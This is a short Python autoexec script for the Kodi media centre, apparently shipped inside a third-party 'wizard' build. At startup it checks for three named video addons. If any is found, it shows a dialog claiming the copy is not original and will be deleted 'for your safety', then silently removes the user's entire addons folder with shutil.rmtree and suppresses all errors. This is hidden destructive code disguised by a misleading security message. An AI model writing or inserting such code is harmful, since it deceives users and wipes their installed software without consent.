# -*- coding: UTF-8 -*-


#######################################################################
#
# autoexec cristalazul
# ----------------------------------------------------------------------------
# Modificación eliminar indigo del sistema. Proveedor: CTA
# ----------------------------------------------------------------------------
#######################################################################

import shutil
import six
from kodi_six import xbmc,xbmcvfs,xbmcgui
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

instalado1 = xbmc.getCondVisibility('System.HasAddon(plugin.video.chopocine)')

instalado2 = xbmc.getCondVisibility('System.HasAddon(plugin.video.choposeries)')

instalado3 = xbmc.getCondVisibility('System.HasAddon(plugin.video.tvchopo)')

alguno_instalado = instalado1 + instalado2 + instalado3

if not alguno_instalado == 0:
    xbmcgui.Dialog().ok('[COLOR gold]INFORMACION IMPORTANTE[/COLOR]',
                '[COLOR red]Hemos detectado que esta copia no es[COLOR gold] ORIGINAL [/COLOR] '
                '[COLOR red]o bien ha sido modificado irregularmente [/COLOR]'
                '[COLOR red]RECUERDA: Si este wizard no lo descargartes desde[COLOR gold] CHIKIRYWIZARD [/COLOR]'
                '[COLOR red]comunicalo en nuestro grupo de Telegram:[COLOR gold] Consultas Chikiry Wizard[/COLOR]'
                '[COLOR blue]POR SU SEGURIDAD Y PARA NO AFECTAR A SU EQUIPO [/COLOR]'
                '[COLOR blue]VAMOS A PROCEDER CON EL BORRADO DEL MISMO [/COLOR]'
                '[COLOR red]Puedes volver a descargarlo y disfrutar de todo el contenido con total SEGURIDAD [/COLOR]')
    try:
        addon_path2 = TRANSLATEPATH(('special://home/addons'))
        addon_path2 = six.ensure_str(addon_path2)
        shutil.rmtree(addon_path2, ignore_errors=True)
    except:
        pass